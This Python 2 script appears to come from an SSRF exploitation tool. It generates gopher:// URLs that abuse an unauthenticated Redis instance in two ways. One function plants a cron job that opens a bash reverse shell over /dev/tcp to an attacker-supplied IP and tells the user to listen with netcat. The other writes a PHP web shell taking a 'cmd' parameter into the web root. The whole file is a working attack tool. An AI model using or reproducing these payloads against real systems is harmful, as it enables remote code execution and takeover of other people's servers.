import urllib

def get_Redis_ReverseShell():
    server = raw_input("Give your IP Address to connect with victim through Revershell: ")
    crontab_dir = raw_input("What can be his Crontab Directory location\n## For debugging you can use /var/lib/redis : ")
    if(not server):
        server = "127.0.0.1"
    if(not crontab_dir):
        crontab_dir = "/var/spool/cron/"
    cmd = '*/1 * * * * bash -c "sh -i >& /dev/tcp/' + server + '/1234 0>&1"'
    len_cmd = len(cmd) + 5
    payload = """*1\r
$8\r
flushall\r
*3\r
$3\r
set\r
$1\r
1\r
$""" + str(len_cmd) + """\r


""" + cmd + """


\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$""" + str(len(crontab_dir)) + """\r
""" + crontab_dir + """\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$4\r
root\r
*1\r
$4\r
save\r

"""
    finalpayload = urllib.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
    print "\nYour gopher link is ready to get Reverse Shell: \n"
    print "gopher://127.0.0.1:6379/_" + finalpayload
    print "\nBefore sending request plz do `nc -lvp 1234`"


def get_Redis_PHPShell():
    web_root_location = raw_input("Give web root location of server : ")
    php_payload = raw_input("Give PHP Payload : ")
    default = "<?php system($_GET['cmd']); ?>"
    if(not php_payload):
        php_payload = default
    if(not web_root_location):
        web_root_location = "/var/www/html"
    payload = """*1\r
$8\r
flushall\r
*3\r
$3\r
set\r
$1\r
1\r
$""" + str(len(php_payload) + 4) + """\r


""" + php_payload + """

\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$""" + str(len(web_root_location)) + """\r
""" + web_root_location + """\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$9\r
shell.php\r
*1\r
$4\r
save\r

"""
    finalpayload = urllib.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
    print "\nYour gopher link is Ready to get PHP Shell: \n"
    print "gopher://127.0.0.1:6379/_" + finalpayload
    print "\nWhen it's done you can get PHP Shell in /shell.php at the server with `cmd` as parmeter. "
